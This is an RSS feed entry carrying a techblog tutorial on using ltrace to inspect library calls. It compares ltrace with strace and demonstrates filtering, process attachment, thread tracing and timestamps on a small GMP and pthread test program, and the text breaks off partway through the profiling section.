<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>ROSEdu Techblog</title>
        <link>http://techblog.rosedu.org</link>
        <description><![CDATA[ROSEdu Techblog]]></description>
        <atom:link href="http://techblog.rosedu.org/rss.xml" rel="self"
                   type="application/rss+xml" />
        <lastBuildDate>Sat, 18 Jan 2014 00:00:00 UT</lastBuildDate>
        <item>
    <title>Inspecting library calls for fun and profit</title>
    <link>http://techblog.rosedu.org/ltrace.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/ltrace.html" title="Inspecting library calls for fun and profit">Inspecting library calls for fun and profit</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on January 18, 2014</span>
      by
      <span class="author">Mihai Maruseac</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/trace.html">trace</a>, <a href="/tags/ltrace.html">ltrace</a>, <a href="/tags/strace.html">strace</a>, <a href="/tags/ptrace.html">ptrace</a>, <a href="/tags/debugging.html">debugging</a></span>
      </span>

      <p>Two years ago this blog had a series of articles on debugging tools. We have presented tools like <a href="http://techblog.rosedu.org/valgrind-introduction.html" title="Valgrind introduction">Valgrind</a> and <a href="http://techblog.rosedu.org/gdb-a-basic-workflow.html" title="GDB - basic workflow">GDB</a> and we stopped with an introduction to <a href="http://techblog.rosedu.org/tracing-processes-for-fun-and-profit.html" title="Tracing Processes for Fun and Profit">strace</a>. At the end of that article we mentioned that there are other tools useful for debugging beyond these three already mentioned. After two years of silence, the debugging series is on with an article on <code>ltrace</code>.</p>
<p>Ask around developers and you’ll see that the proportion of those knowing about <code>ltrace</code> compared to those knowing how to use <code>strace</code> is at most the same as the proportion of <code>strace</code> users among users knowing how to use <code>gdb</code> and <code>valgrind</code>.</p>
<p>But how is <code>ltrace</code> different? Why is this an useful tool? This article will try to shine some light on this while also providing comparisons with the <code>strace</code> tool.</p>
<section id="basic-example" class="level3">
<h3>Basic Example</h3>
<p>The simples way to use both <code>ltrace</code> and <code>strace</code> is to append this tool in front of the command you’re tracing. We will illustrate here the <a href="http://techblog.rosedu.org/tracing-processes-for-fun-and-profit.html#simple-example" title="Tracing Processes for Fun and Profit">same example used for <code>strace</code></a></p>
<pre><code>$ ltrace ls
__libc_start_main(0x402c60, 1, 0x7fffa36d7038, 0x412bb0 &lt;unfinished ...&gt;
strrchr(&quot;ls&quot;, &#39;/&#39;)                               = nil
setlocale(LC_ALL, &quot;&quot;)                            = &quot;en_US.UTF-8&quot;
bindtextdomain(&quot;coreutils&quot;, &quot;/usr/share/locale&quot;) = &quot;/usr/share/locale&quot;
textdomain(&quot;coreutils&quot;)                          = &quot;coreutils&quot;
__cxa_atexit(0x40ace0, 0, 0, 0x736c6974756572)   = 0
isatty(1)                                        = 1
getenv(&quot;QUOTING_STYLE&quot;)                          = nil
getenv(&quot;COLUMNS&quot;)                                = nil
ioctl(1, 21523, 0x7fffa36d6bd0)                  = 0
getenv(&quot;TABSIZE&quot;)                                = nil
getopt_long(1, 0x7fffa36d7038, &quot;abcdfghiklmnopqrstuvw:xABCDFGHI:&quot;..., 0x61a5e0, -1)         = -1
getenv(&quot;LS_BLOCK_SIZE&quot;)                          = nil
...
opendir(&quot;.&quot;)                                     = 0x2789c30
readdir(0x2789c30)                               = 0x2789c60
readdir(0x2789c30)                               = 0x2789c78
readdir(0x2789c30)                               = 0x2789c90
strlen(&quot;a.out&quot;)                                  = 5
malloc(6)                                        = 0x2791c70
memcpy(0x2791c70, &quot;a.out\0&quot;, 6)                  = 0x2791c70
readdir(0x2789c30)                               = 0x2789cb0
strlen(&quot;out.9373&quot;)                               = 8
malloc(9)                                        = 0x2791c90
memcpy(0x2791c90, &quot;out.9373\0&quot;, 9)               = 0x2791c90
...
closedir(0x2789c30)                              = 0
free(0)                                          = &lt;void&gt;
malloc(432)                                      = 0x2789c30
_setjmp(0x61b640, 0x400000, 0x2785e50, 0x2789cc0)= 0
__errno_location()                               = 0x7f95ad5916c0
strcoll(&quot;out.9307&quot;, &quot;1.c&quot;)                       = 23
...
fwrite_unlocked(&quot;1.c&quot;, 1, 3, 0x3573db9400)       = 3
...
fwrite_unlocked(&quot;out&quot;, 1, 3, 0x3573db9400)       = 3
...
exit(0 &lt;unfinished ...&gt;
__fpending(0x3573db9400, 0, 64, 0x3573db9eb0)    = 0
fileno(0x3573db9400)                             = 1
__freading(0x3573db9400, 0, 64, 0x3573db9eb0)    = 0
__freading(0x3573db9400, 0, 2052, 0x3573db9eb0)  = 0
fflush(0x3573db9400)                             = 0
fclose(0x3573db9400)                             = 0
__fpending(0x3573db91c0, 0, 0x3573dbaa00, 0xfbad000c)= 0
fileno(0x3573db91c0)                             = 2
__freading(0x3573db91c0, 0, 0x3573dbaa00, 0xfbad000c)= 0
__freading(0x3573db91c0, 0, 4, 0xfbad000c)       = 0
fflush(0x3573db91c0)                             = 0
fclose(0x3573db91c0)                             = 0
+++ exited (status 0) +++</code></pre>
<p>Looking at the trace we see that the <code>ls</code> process starts by acknowledging the current <a href="http://en.wikipedia.org/wiki/Locale" title="Locale (computing)">locale</a> after which several environment variables which control the output are read (only a few of them shown, the others ellided by <code>...</code>). Then <a href="http://linuxmanpages.com/man3/opendir.3.php" title="opendir - open a directory"><code>opendir</code></a> is called on <code>.</code> (since <code>ls</code> had no other arguments) and each entry is read via <a href="http://linuxmanpages.com/man2/readdir.2.php" title="readdir - read directory entry"><code>readdir</code></a> and then copied into a vector of entries (after using <code>strdup</code> seen here as a triple of <code>strlen</code>, <code>malloc</code> and <code>memcpy</code>). Next step is to sort all of these entries according to the current locale (<a href="http://linuxmanpages.com/man3/strcoll.3.php" title="strcoll - compare two strings using the current locale"><code>strcoll</code></a>, the variable <code>LC_COLLATE</code>). This allows sorting the filenames in alphabetical order. Then, each filename is written on the <code>1</code> file descriptor (<code>stdout</code>) using the non-blocking <a href="http://linuxmanpages.com/man3/fwrite_unlocked.3.php" title="fwrite_unlocked - non-locking stdio function"><code>fwrite_unlocked</code></a>. Last step is to call <code>exit</code> and flush all open streams.</p>
<p>Right now you are more enlightened on what <code>ls</code> does than before reading this part. Knowing the above information you can do things like changing the way files are quoted (I retrieved the options by providing an invalid value and looking on the <code>QUOTING_STYLE='-' ltrace ls</code> output to see what arguments are tested for):</p>
<pre><code>$ ls a*
a file  a.out

$ QUOTING_STYLE=&quot;shell&quot; ls a*
&#39;a file&#39;  a.out

$ QUOTING_STYLE=&quot;c&quot; ls a*
&quot;a file&quot;  &quot;a.out&quot;</code></pre>
<p>The next question we are interested in is “<em>Can <code>ltrace</code> trace syscalls as well?</em>”. Luckily, the answer is <em>yes</em>, by using the <code>-S</code> flag:</p>
<pre><code>$ ltrace -S ls
SYS_brk(0)                               = 0x1d4b000
SYS_mmap(0, 4096, 3, 34)                 = 0x7f4d8b352000
SYS_access(&quot;/etc/ld.so.preload&quot;, 04)     = -2
SYS_open(&quot;/etc/ld.so.cache&quot;, 524288, 01) = 3
SYS_fstat(3, 0x7fff9f3a4110)             = 0
SYS_mmap(0, 0x246b0, 1, 2)               = 0x7f4d8b32d000
...</code></pre>
<p>Contrast with the results of <code>strace</code>:</p>
<pre><code>$ strace ls
execve(&quot;/usr/bin/ls&quot;, [&quot;ls&quot;], [/* 48 vars */]) = 0
brk(0)                                  = 0x1190000
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fcf80794000
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=149168, ...}) = 0
mmap(NULL, 149168, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fcf8076f000
...</code></pre>
<p>Differences are easily seen. The main one is that <code>ltrace</code> prefixes each syscall with <code>SYS_</code> and doesn’t represent macros as macros but expands them (so instead of <code>PROT_READ|PROT_WRITE</code> you have <code>3</code>). In fact, even the number of arguments is different. For understandability reason, it is better to use <code>strace</code> for tracing the system calls and <code>ltrace</code> for tracing the library ones.</p>
</section>
<section id="why-is-ltrace-useful" class="level3">
<h3>Why Is <code>ltrace</code> Useful?</h3>
<p>From the above section you have seen that we can use <code>ltrace</code> to understand undocumented behavior of an application. For example the <code>QUOTING_STYLE</code> was found neither in the <a href="http://linuxmanpages.com/man1/ls.1.php" title="ls - list directory contents"><code>ls</code></a> manual nor in the <a href="http://linuxmanpages.com/man1/bash.1.php" title="bash - GNU Bourne-Again SHell"><code>bash</code></a> one.</p>
<p>Another way <code>ltrace</code> is useful is when one of the libraries your application depends on is faulty. Instead of trying to debug a full-scale application you might want to isolate the culprit into a minimal application which exhibits only the bad behaviour. For that, you can use <code>ltrace</code> in the same way we used <code>strace</code> in <a href="http://techblog.rosedu.org/tracing-processes-for-fun-and-profit.html#how-is-this-useful" title="Tracing Processes for Fun and Profit">its own article</a> in the past.</p>
</section>
<section id="i-have-too-much-output" class="level3">
<h3>I Have Too Much Output</h3>
<p>Like in the case of <a href="http://techblog.rosedu.org/tracing-processes-for-fun-and-profit.html#too-much-output" title="Tracing Processes for Fun and Profit"><code>strace</code></a>, <code>ltrace</code> produces a long list of output lines and it is quite hard to find what you’re looking for or to understand what’s happening while they are scrolling on the screen.</p>
<p>Just like <code>strace</code> we can save the output to a file, using <code>-o</code>:</p>
<pre><code>$ ltrace -o ltraceout ls
$ wc -l ltraceout
523 ltraceout
$ head ltraceout
__libc_start_main(0x402c60, 1, 0x7fffbc2e3348, 0x412bb0 &lt;unfinished ...&gt;
strrchr(&quot;ls&quot;, &#39;/&#39;)                              = nil
setlocale(LC_ALL, &quot;&quot;)                           = &quot;en_US.UTF-8&quot;
bindtextdomain(&quot;coreutils&quot;, &quot;/usr/share/locale&quot;)= &quot;/usr/share/locale&quot;
textdomain(&quot;coreutils&quot;)                         = &quot;coreutils&quot;
__cxa_atexit(0x40ace0, 0, 0, 0x736c6974756572)  = 0
isatty(1)                                       = 1
getenv(&quot;QUOTING_STYLE&quot;)                         = nil
getenv(&quot;COLUMNS&quot;)                               = nil
ioctl(1, 21523, 0x7fffbc2e2ee0)                 = 0</code></pre>
<p>Like <code>strace</code>, we can also use <code>-e</code> to filter on specific calls.</p>
<p>In the following examples we would use the following C source file which computes <code>41^41</code> and <code>42^42</code> both using the float <code>libmath</code> version and the <code>libgmp</code> multi-precision integers one. We will use threads to compute <code>42^42</code> and compute <code>41^41</code> in the <code>main</code> function with both arguments.</p>
<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="ot">#include &lt;math.h&gt;</span>
<span class="ot">#include &lt;pthread.h&gt;</span>
<span class="ot">#include &lt;stdio.h&gt;</span>
<span class="ot">#include &lt;stdlib.h&gt;</span>

<span class="ot">#include &lt;gmp.h&gt;</span>

<span class="dt">void</span> *do_double_thread(<span class="dt">void</span> *data)
{
  <span class="dt">double</span> x = <span class="dv">42</span>;
  x = pow(x, x);
}

<span class="dt">void</span> *do_mpz_thread(<span class="dt">void</span> *data)
{
  mpz_t x;

  mpz_init_set_ui(x, <span class="dv">42</span>);
  mpz_pow_ui(x, x, <span class="dv">42</span>);

  mpz_clear(x);
}

<span class="dt">int</span> main()
{
  pthread_t double_thread, mpz_thread;
  pthread_attr_t attr;

  <span class="dt">double</span> y = <span class="dv">41</span>;
  mpz_t x;

  mpz_init_set_ui(x, <span class="dv">41</span>);
  mpz_pow_ui(x, x, <span class="dv">41</span>);

  mpz_clear(x);

  y = pow(y, y);

  <span class="co">/* initialize the attribute */</span>
  <span class="kw">if</span> (pthread_attr_init(&amp;attr) != <span class="dv">0</span>) {
    perror(<span class="st">&quot;pthread_attr_init&quot;</span>);
    pthread_exit(NULL);
  }

  <span class="co">/* set detached state */</span>
  <span class="kw">if</span> (pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE) != <span class="dv">0</span>) {
    perror(<span class="st">&quot;pthread_attr_setdetachstate&quot;</span>);
    pthread_exit(NULL);
  }

  <span class="kw">if</span> (pthread_create(&amp;double_thread, &amp;attr, do_double_thread, NULL)) {
    perror(<span class="st">&quot;pthread_create&quot;</span>);
    exit(EXIT_FAILURE);
  }

  <span class="kw">if</span> (pthread_create(&amp;mpz_thread, &amp;attr, do_mpz_thread, NULL)) {
    perror(<span class="st">&quot;pthread_create&quot;</span>);
    exit(EXIT_FAILURE);
  }

  pthread_attr_destroy(&amp;attr);

  <span class="kw">if</span> (pthread_join(double_thread, NULL))
    perror(<span class="st">&quot;pthread_join&quot;</span>);

  <span class="kw">if</span> (pthread_join(mpz_thread, NULL))
    perror(<span class="st">&quot;pthread_join&quot;</span>);

  <span class="kw">return</span> <span class="dv">0</span>;
}</code></pre>
<p>To compile, we have to link against <code>libmath</code>, <code>libpthread</code> and <code>libgmp</code>:</p>
<pre><code>$ gcc -lm -lpthread -lgmp test.c -o test</code></pre>
<p>Running <code>ltrace</code> on the full output we have the following:</p>
<pre><code>$ ltrace ./test
__libc_start_main(0x400aeb, 1, 0x7fff6afa8b78, 0x400c60 &lt;unfinished ...&gt;
__gmpz_init_set_ui(0x7fff6afa8a30, 41, 0x7fff6afa8b88, 0x400c60)     = 1
__gmpz_pow_ui(0x7fff6afa8a30, 0x7fff6afa8a30, 41, 0x7fff6afa8a30)    = 0
__gmpz_clear(0x7fff6afa8a30, 0x6bb020, 0, 0x129c08be7ca69)           = 0
pow(0x3573db8760, 0xffffffff, 0x4044800000000000, 0)                 = 0x4da9465e5d9d1629
pthread_attr_init(0x7fff6afa8a40, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
pthread_attr_setdetachstate(0x7fff6afa8a40, 0, 0x7fefffffffffffff, 0)= 0
pthread_create(0x7fff6afa8a80, 0x7fff6afa8a40, 0x400a60, 0)          = 0
pthread_create(0x7fff6afa8a78, 0x7fff6afa8a40, 0x400aa8, 0)          = 0
pthread_attr_destroy(0x7fff6afa8a40, 0x7f60ece77fb0, 0x7f60ece789d0, -1)= 0
pthread_join(0x7f60ed679700, 0, 0x7f60ece789d0, -1)                  = 0
pthread_join(0x7f60ece78700, 0, 0x7f60ed679700, 0x3574418290)        = 0
+++ exited (status 0) +++</code></pre>
<p>If we want to capture only the bignum operations we can use <code>-e</code> flag:</p>
<pre><code>$ ltrace -e &#39;*gmpz*&#39; ./test
test-&gt;__gmpz_init_set_ui(0x7ffffb01f830, 41, 0x7ffffb01f988, 0x400c60)= 1
test-&gt;__gmpz_pow_ui(0x7ffffb01f830, 0x7ffffb01f830, 41, 0x7ffffb01f830 &lt;unfinished ...&gt;
libgmp.so.10-&gt;__gmpz_n_pow_ui(0x7ffffb01f830, 0xbf0010, 1, 41 &lt;unfinished ...&gt;
libgmp.so.10-&gt;__gmpz_realloc(0x7ffffb01f830, 7, 42, 7)         = 0xbf0010
&lt;... __gmpz_n_pow_ui resumed&gt; )                                  = 0
&lt;... __gmpz_pow_ui resumed&gt; )                                    = 0
test-&gt;__gmpz_clear(0x7ffffb01f830, 0xbf0020, 0, 0x129c08be7ca69) = 0
+++ exited (status 0) +++</code></pre>
<p>From this output we see that <code>__gmpz_pow_ui</code> from our code calls <code>__gmpz_n_pow_ui</code> from <code>libgmp.so.10</code> which in turn calls <code>__gmpz_realloc</code> to expand the space allocated to the number.</p>
<p>However, in some cases one library might call functions from another or you might want to filter and keep only the calls done by your application. Fortunately, we can still do that:</p>
<pre><code>$ ltrace -e &#39;*gmpz*-@libgmp.so*&#39; ./test
test-&gt;__gmpz_init_set_ui(0x7fff45c5cd70, 41, 0x7fff45c5cec8, 0x400c60) = 1
test-&gt;__gmpz_pow_ui(0x7fff45c5cd70, 0x7fff45c5cd70, 41, 0x7fff45c5cd70)= 0
test-&gt;__gmpz_clear(0x7fff45c5cd70, 0xc02020, 0, 0x129c08be7ca69)       = 0
+++ exited (status 0) +++</code></pre>
<p>If you want to trace all calls <em>inside</em> a library then it is better to use <code>-x</code>.</p>
<pre><code>$ ltrace -x &#39;@libgmp.so.*&#39; ./test
__libc_start_main(0x400aeb, 1, 0x7fff656660b8, 0x400c60 &lt;unfinished ...&gt;
__gmpz_init_set_ui(0x7fff65665f70, 41, 0x7fff656660c8, 0x400c60 &lt;unfinished ...&gt;
__gmpz_init_set_ui@libgmp.so.10(0x7fff65665f70, 41, 0x7fff656660c8, 0x400c60 &lt;unfinished ...&gt;
__gmp_default_allocate@libgmp.so.10(8, 41, 0x7fff656660c8, 0x400c60)= 0x222a010
&lt;... __gmpz_init_set_ui resumed&gt; )= 1
&lt;... __gmpz_init_set_ui resumed&gt; )= 1
__gmpz_pow_ui(0x7fff65665f70, 0x7fff65665f70, 41, 0x7fff65665f70 &lt;unfinished ...&gt;
__gmpz_pow_ui@libgmp.so.10(0x7fff65665f70, 0x7fff65665f70, 41, 0x7fff65665f70 &lt;unfinished ...&gt;
__gmpz_n_pow_ui@libgmp.so.10(0x7fff65665f70, 0x222a010, 1, 41 &lt;unfinished ...&gt;
__gmpz_realloc@libgmp.so.10(0x7fff65665f70, 7, 42, 7 &lt;unfinished ...&gt;
__gmp_default_reallocate@libgmp.so.10(0x222a010, 8, 56, 7)= 0x222a010
&lt;... __gmpz_realloc resumed&gt; )= 0x222a010
__gmpn_sqr@libgmp.so.10(0x222a010, 0x7fff65665e80, 2, 48 &lt;unfinished ...&gt;
__gmpn_sqr_basecase@libgmp.so.10(0x222a010, 0x7fff65665e80, 2, 48)= 0x3562f3ea0787ecff
&lt;... __gmpn_sqr resumed&gt; )= 0
__gmpn_mul_1@libgmp.so.10(0x222a010, 0x222a010, 3, 0x129c08be7ca69)= 0xca32f2e
&lt;... __gmpz_n_pow_ui resumed&gt; )= 0
&lt;... __gmpz_pow_ui resumed&gt; )= 0
&lt;... __gmpz_pow_ui resumed&gt; )= 0
__gmpz_clear(0x7fff65665f70, 0x222a020, 0, 0x129c08be7ca69 &lt;unfinished ...&gt;
__gmpz_clear@libgmp.so.10(0x7fff65665f70, 0x222a020, 0, 0x129c08be7ca69 &lt;unfinished ...&gt;
__gmp_default_free@libgmp.so.10(0x222a010, 56, 0, 0x129c08be7ca69)= 0
&lt;... __gmpz_clear resumed&gt; )= 0
&lt;... __gmpz_clear resumed&gt; )= 0
pow(0x3573db8760, 0xffffffff, 0x4044800000000000, 0)= 0x4da9465e5d9d1629
pthread_attr_init(0x7fff65665f80, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
pthread_attr_setdetachstate(0x7fff65665f80, 0, 0x7fefffffffffffff, 0)= 0
pthread_create(0x7fff65665fc0, 0x7fff65665f80, 0x400a60, 0)= 0
pthread_create(0x7fff65665fb8, 0x7fff65665f80, 0x400aa8, 0)= 0
pthread_attr_destroy(0x7fff65665f80, 0x7f3164bc1fb0, 0x7f3164bc29d0, -1)= 0
pthread_join(0x7f31653c3700, 0, 0x7f3164bc29d0, -1)= 0
pthread_join(0x7f3164bc2700, 0, 0x7f31653c3700, 0x3574418290)= 0
_fini@libgmp.so.10(0x358cc761f0, 0, 0xffffffff, 0)= 0x358ca5edc4
+++ exited (status 0) +++</code></pre>
<p>To catch only the calls to the specific library use <code>-L</code> which will make <code>ltrace</code> not trace anything from the <code>MAIN</code> library:</p>
<pre><code>$ ltrace -L -x &#39;@libgmp.so.*&#39; ./test
__gmpz_init_set_ui@libgmp.so.10(0x7fffbf630930, 41, 0x7fffbf630a88, 0x400c60 &lt;unfinished ...&gt;
__gmp_default_allocate@libgmp.so.10(8, 41, 0x7fffbf630a88, 0x400c60)= 0x17b5010
&lt;... __gmpz_init_set_ui resumed&gt; )= 1
__gmpz_pow_ui@libgmp.so.10(0x7fffbf630930, 0x7fffbf630930, 41, 0x7fffbf630930 &lt;unfinished ...&gt;
__gmpz_n_pow_ui@libgmp.so.10(0x7fffbf630930, 0x17b5010, 1, 41 &lt;unfinished ...&gt;
__gmpz_realloc@libgmp.so.10(0x7fffbf630930, 7, 42, 7 &lt;unfinished ...&gt;
__gmp_default_reallocate@libgmp.so.10(0x17b5010, 8, 56, 7)= 0x17b5010
&lt;... __gmpz_realloc resumed&gt; )= 0x17b5010
__gmpn_sqr@libgmp.so.10(0x17b5010, 0x7fffbf630840, 2, 48 &lt;unfinished ...&gt;
__gmpn_sqr_basecase@libgmp.so.10(0x17b5010, 0x7fffbf630840, 2, 48)= 0x3562f3ea0787ecff
&lt;... __gmpn_sqr resumed&gt; )= 0
__gmpn_mul_1@libgmp.so.10(0x17b5010, 0x17b5010, 3, 0x129c08be7ca69)= 0xca32f2e
&lt;... __gmpz_n_pow_ui resumed&gt; )= 0
&lt;... __gmpz_pow_ui resumed&gt; )= 0
__gmpz_clear@libgmp.so.10(0x7fffbf630930, 0x17b5020, 0, 0x129c08be7ca69 &lt;unfinished ...&gt;
__gmp_default_free@libgmp.so.10(0x17b5010, 56, 0, 0x129c08be7ca69)= 0
&lt;... __gmpz_clear resumed&gt; )= 0
_fini@libgmp.so.10(0x358cc761f0, 0, 0xffffffff, 0)= 0x358ca5edc4
+++ exited (status 0) +++</code></pre>
</section>
<section id="attaching-to-other-processes" class="level3">
<h3>Attaching To Other Processes</h3>
<p>Like in <a href="http://techblog.rosedu.org/tracing-processes-for-fun-and-profit.html#but-i-started-the-process.." title="Tracing Processes for Fun and Profit"><code>strace</code></a> case, we can use <code>-p</code> to attach to running processes:</p>
<pre><code>$ ./test &amp;
[1] 26026

$ ltrace -p 26026
__gmpz_clear(0x7fff1fa3bb50, 1, 0, 0x1b9b000)= 0
pow(0x7f2c3dca8000, 0x49ff000, 0x4044800000000000, -1)= 0x4da9465e5d9d1629
pthread_attr_init(0x7fff1fa3bb60, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
pthread_attr_setdetachstate(0x7fff1fa3bb60, 0, 0x7fefffffffffffff, 0)= 0
pthread_create(0x7fff1fa3bba8, 0x7fff1fa3bb60, 0x400a60, 0)= 0
pthread_create(0x7fff1fa3bba0, 0x7fff1fa3bb60, 0x400aa8, 0)= 0
pthread_attr_destroy(0x7fff1fa3bb60, 0x7f2c42073fb0, 0x7f2c420749d0, -1)= 0
pthread_join(0x7f2c42875700, 0, 0x7f2c420749d0, -1)= 0
pthread_join(0x7f2c42074700, 0, 0x7f2c42875700, 0x3574418290)= 0
+++ exited (status 0) +++
[1]+  Done                    ./test</code></pre>
<p>In fact, just as <code>strace</code>, we can use multiple <code>-p</code> arguments to attach to multiple processes simultaneously:</p>
<pre><code>$ ./test &amp; ./test &amp;
[1] 26149
[2] 26150

$ ltrace -p 26149 -p 26150
__gmpz_clear(0x7fff52a4fed0, 1, 0, 0xa2c000)= 0
pow(0x7f85fb6f0000, 0x49ff000, 0x4044800000000000, -1)= 0x4da9465e5d9d1629
pthread_attr_init(0x7fff52a4fee0, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
pthread_attr_setdetachstate(0x7fff52a4fee0, 0, 0x7fefffffffffffff, 0)= 0
pthread_create(0x7fff52a4ff28, 0x7fff52a4fee0, 0x400a60, 0)= 0
pthread_create(0x7fff52a4ff20, 0x7fff52a4fee0, 0x400aa8, 0)= 0
pthread_attr_destroy(0x7fff52a4fee0, 0x7f85ffabbfb0, 0x7f85ffabc9d0, -1)= 0
pthread_join(0x7f86002bd700, 0, 0x7f85ffabc9d0, -1)= 0
pthread_join(0x7f85ffabc700, 0, 0x7f86002bd700, 0x3574418290)= 0
+++ exited (status 0) +++
__gmpz_clear(0x7fff4cbac6e0, 1, 0, 0x1207000)= 0
pow(0x7fbf03640000, 0x49ff000, 0x4044800000000000, -1)= 0x4da9465e5d9d1629
pthread_attr_init(0x7fff4cbac6f0, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
pthread_attr_setdetachstate(0x7fff4cbac6f0, 0, 0x7fefffffffffffff, 0)= 0
pthread_create(0x7fff4cbac738, 0x7fff4cbac6f0, 0x400a60, 0)= 0
pthread_create(0x7fff4cbac730, 0x7fff4cbac6f0, 0x400aa8, 0)= 0
pthread_attr_destroy(0x7fff4cbac6f0, 0x7fbf07a0bfb0, 0x7fbf07a0c9d0, -1)= 0
pthread_join(0x7fbf0820d700, 0, 0x7fbf07a0c9d0, -1)= 0
pthread_join(0x7fbf07a0c700, 0, 0x7fbf0820d700, 0x3574418290)= 0
+++ exited (status 0) +++
[1]-  Done                    ./test
[2]+  Done                    ./test</code></pre>
<p>Though, this case is useful only when debugging multiple programs which need to communicate between themselves, it is nice to know that this is possible.</p>
</section>
<section id="tracing-the-threads-and-children-of-a-process" class="level3">
<h3>Tracing the Threads and Children of a Process</h3>
<p>The <code>strace</code> tools allows attaching to subprocesses of a process using <code>-f</code>. Also, you can use <code>-ff</code> with a <code>-o</code> to get the output of each thread in a separate file.</p>
<p>However, <code>ltrace</code> knows only the <code>-f</code> option. Lines from different processes are prefixed with the <code>PID</code> of that process.</p>
<pre><code>$ ltrace -f ./test
[pid 26192] __libc_start_main(0x400aeb, 1, 0x7fffc406b9c8, 0x400c60 &lt;unfinished ...&gt;
[pid 26192] __gmpz_init_set_ui(0x7fffc406b880, 41, 0x7fffc406b9d8, 0x400c60)= 1
[pid 26192] __gmpz_pow_ui(0x7fffc406b880, 0x7fffc406b880, 41, 0x7fffc406b880)= 0
[pid 26192] __gmpz_clear(0x7fffc406b880, 0x1b21020, 0, 0x129c08be7ca69)= 0
[pid 26192] pow(0x3573db8760, 0xffffffff, 0x4044800000000000, 0)= 0x4da9465e5d9d1629
[pid 26192] pthread_attr_init(0x7fffc406b890, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
[pid 26192] pthread_attr_setdetachstate(0x7fffc406b890, 0, 0x7fefffffffffffff, 0)           = 0
[pid 26192] pthread_create(0x7fffc406b8d0, 0x7fffc406b890, 0x400a60, 0)= 0
[pid 26193] pow(0, 0, 0x4045000000000000, -1 &lt;unfinished ...&gt;
[pid 26192] pthread_create(0x7fffc406b8c8, 0x7fffc406b890, 0x400aa8, 0 &lt;unfinished ...&gt;
[pid 26193] &lt;... pow resumed&gt; )= 0x4e1646505f35a847
[pid 26193] +++ exited (status 0) +++
[pid 26192] &lt;... pthread_create resumed&gt; )= 0
[pid 26192] pthread_attr_destroy(0x7fffc406b890, 0x7fc1a1041fb0, 0x7fc1a10429d0, -1)= 0
[pid 26192] pthread_join(0x7fc1a1843700, 0, 0x7fc1a10429d0, -1)= 0
[pid 26192] pthread_join(0x7fc1a1042700, 0, 0x7fc1a1843700, 0x3574418290 &lt;unfinished ...&gt;
[pid 26194] __gmpz_init_set_ui(0x7fc1a1041f00, 42, 0x59a85877c49edc2b, -1)= 1
[pid 26194] __gmpz_pow_ui(0x7fc1a1041f00, 0x7fc1a1041f00, 42, 0x7fc1a1041f00)= 0
[pid 26194] __gmpz_clear(0x7fc1a1041f00, 0x7fc19c0008c0, 0, 42)= 0
[pid 26192] &lt;... pthread_join resumed&gt; )= 0
[pid 26194] +++ exited (status 0) +++
[pid 26192] +++ exited (status 0) +++</code></pre>
<p>Thus, if you want to filter only a single child you have to resort to text filter utilities like <code>grep</code>.</p>
</section>
<section id="profiling" class="level3">
<h3>Profiling</h3>
<p>One nice thing about <code>strace</code> is that you can use the <code>-c</code> flag to get a table with all syscalls used in a program, the time needed to execute them and the count of error results. However, <code>ltrace</code> lacks this option but it can be simulated by using the other timing options and text filters.</p>
<p>Both <code>strace</code> and <code>ltrace</code> allow you to get timestamps around any call by using <code>-r</code>, <code>-t</code>, <code>-tt</code> or <code>-ttt</code>:</p>
<p><code>-r</code> shows a relative timestamp since program startup</p>
<pre><code>$ ltrace -r ./test
  0.000000 __libc_start_main(0x400aeb, 1, 0x7fff2a51a328, 0x400c60 &lt;unfinished ...&gt;
  0.000418 __gmpz_init_set_ui(0x7fff2a51a1e0, 41, 0x7fff2a51a338, 0x400c60)= 1
  0.000296 __gmpz_pow_ui(0x7fff2a51a1e0, 0x7fff2a51a1e0, 41, 0x7fff2a51a1e0)= 0
  0.000166 __gmpz_clear(0x7fff2a51a1e0, 0x1f66020, 0, 0x129c08be7ca69)= 0
  0.000137 pow(0x3573db8760, 0xffffffff, 0x4044800000000000, 0)= 0x4da9465e5d9d1629
  0.000168 pthread_attr_init(0x7fff2a51a1f0, 213, 0x7fefffffffffffff, 0x7fffffffffffffff)= 0
  0.000147 pthread_attr_setdetachstate(0x7fff2a51a1f0, 0, 0x7fefffffffffffff, 0)= 0
  0.000216 pthread_create(0x7fff2a51a230, 0x7fff2a51a1f0, 0x400a60, 0)= 0
  0.000409 pthread_create(0x7fff2a51a228, 0x7fff2a51a1f0, 0x400aa8, 0)= 0
  0.000474 pthread_attr_destroy(0x7fff2a51a1f0, 0x7f25016c5fb0, 0x7f25016c69d0, -1)= 0
  0.000250 pthread_join(0x7f2501ec7700, 0, 0x7f25016c69d0, -1)= 0
  0.000257 pthread_join(0x7f25016c6700, 0, 0x7f2501ec7700, 0x3574418290)= 0
  0.000735 +++ exited (status 0) +++</code></pre>
<p><code>-t</code> shows the time of day when the call was made</p>
<pre><code>$ ltrace -t ./test
14:50:42 __libc_start_main(0x400aeb, 1, 0x7fff84229b38, 0x400c60 &lt;unfinished ...&gt;
14:50:42 __gmpz_init_set_ui(0x7fff842299f0, 41, 0x7fff84229b48, 0x400c60)= 1
14:50:42 __gmpz_pow_ui(0x7fff842299f0, 0x7fff842299f0, 41, 0x7fff842299f0)= 0
